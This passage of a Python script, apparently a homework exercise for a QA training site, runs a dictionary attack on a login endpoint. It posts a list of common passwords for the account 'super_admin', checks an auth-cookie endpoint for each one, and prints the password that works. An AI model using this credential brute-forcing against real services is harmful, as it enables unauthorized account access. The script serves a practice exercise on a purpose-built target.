...
password_list = (
        ...
        25    Football    password1    000000    trustno1    starwars    password1    trustno1    qwerty123    123qwe".split())

unique_password = list(set(password_list))

for u in unique_password:
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework',
                             data={"login": "super_admin", "password": f'{u}'})

    resp_cookies = response.cookies
    response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=resp_cookies)
    if response2.text == 'You are authorized':
        print(response2.text + '. Password: ' + u)
        # You are authorized. Password: welcome
